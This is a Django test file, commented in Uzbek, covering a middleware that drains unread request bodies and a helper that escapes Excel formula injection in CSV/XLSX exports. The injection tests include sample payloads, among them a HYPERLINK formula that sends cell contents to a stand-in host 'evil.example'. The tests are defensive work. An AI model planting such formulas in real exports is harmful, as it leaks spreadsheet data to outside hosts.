import io

from django.test import RequestFactory, SimpleTestCase

from .middleware import DrainRequestBodyMiddleware


class DrainRequestBodyMiddlewareTests(SimpleTestCase):
    """View tanaga tegmasdan javob qaytarganda so'rov tanasi oxirigacha o'qiladi.

    Bu holat 401/403/429 (autentifikatsiya, ruxsat, throttle) javoblarida yuz
    beradi — DRF ular uchun view'ni umuman ishga tushirmaydi, ya'ni multipart
    tana o'qilmay qoladi. Tana o'qilmasa HTTP/1.1 server ulanishni yopadi va
    hali fayl yuborayotgan brauzer javob o'rniga tarmoq xatosi oladi.
    """

    def setUp(self):
        self.factory = RequestFactory()

    def _request(self, body, content_length=None):
        request = self.factory.post('/api/questions/pdf-preview/', data=b'', content_type='application/pdf')
        request._stream = io.BytesIO(body)
        request.META['CONTENT_LENGTH'] = str(len(body) if content_length is None else content_length)
        return request

    def _run(self, request, response=None):
        middleware = DrainRequestBodyMiddleware(lambda req: response or 'response')
        return middleware(request)

    def test_unread_body_is_drained(self):
        body = b'x' * (256 * 1024)
        request = self._request(body)
        self._run(request)
        self.assertEqual(request._stream.read(), b'')

    def test_already_read_body_is_a_noop(self):
        body = b'x' * 1024
        request = self._request(body)
        self.assertEqual(request.read(), body)
        self._run(request)
        self.assertEqual(request._stream.read(), b'')

    def test_body_over_limit_is_not_drained(self):
        # Limitdan katta tanani o'qish DoS vektori bo'lardi; bunday so'rov
        # baribir hech bir endpoint hajm chegarasiga sig'maydi.
        body = b'x' * 2048
        request = self._request(body)
        with self.settings(MAX_DRAIN_REQUEST_BODY_BYTES=1024):
            middleware = DrainRequestBodyMiddleware(lambda req: 'response')
            middleware(request)
        self.assertEqual(len(request._stream.read()), len(body))

    def test_get_request_is_a_noop(self):
        request = self.factory.get('/api/questions/')
        request._stream = io.BytesIO(b'unexpected')
        request.META['CONTENT_LENGTH'] = '10'
        self._run(request)
        self.assertEqual(request._stream.read(), b'unexpected')

    def test_unreadable_stream_does_not_break_the_response(self):
        class Broken:
            def read(self, *args):
                raise OSError('connection reset')

        request = self._request(b'x' * 64)
        request._stream = Broken()
        self.assertEqual(self._run(request), 'response')


class SpreadsheetSafeTests(SimpleTestCase):
    """`spreadsheet_safe` — CSV/XLSX eksportida Excel formula injection himoyasi.

    `full_name` foydalanuvchi yozadigan matn (serializer'da faqat
    `max_length=120`) va to'g'ridan-to'g'ri katakchaga yozilsa Excel uni
    formula deb bajaradi.
    """

    def test_formula_prefixes_are_neutralized(self):
        from .export_utils import spreadsheet_safe

        for value in ('=1+1', '+1', '-1', '@SUM(A1)', '\t=cmd', '\r=cmd'):
            self.assertEqual(spreadsheet_safe(value), f"'{value}", value)

    def test_hyperlink_payload_is_neutralized(self):
        from .export_utils import spreadsheet_safe

        payload = '=HYPERLINK("http://evil.example/"&A1,"Bosing")'
        self.assertEqual(spreadsheet_safe(payload), f"'{payload}")

    def test_ordinary_text_is_untouched(self):
        from .export_utils import spreadsheet_safe

        self.assertEqual(spreadsheet_safe("Ali Valiyev"), 'Ali Valiyev')
        self.assertEqual(spreadsheet_safe('+998901234567'), "'+998901234567")

    def test_non_string_values_keep_their_type(self):
        """Sonlarga apostrof qo'shilmaydi — aks holda Excel'da saralash buzilardi."""
        from .export_utils import spreadsheet_safe

        self.assertEqual(spreadsheet_safe(42), 42)
        self.assertEqual(spreadsheet_safe(3.5), 3.5)
        self.assertEqual(spreadsheet_safe(None), '')

    def test_row_helper_applies_to_every_column(self):
        from .export_utils import spreadsheet_safe_row

        self.assertEqual(
            spreadsheet_safe_row(['=evil', 'ok', 7]),
            ["'=evil", 'ok', 7],
        )
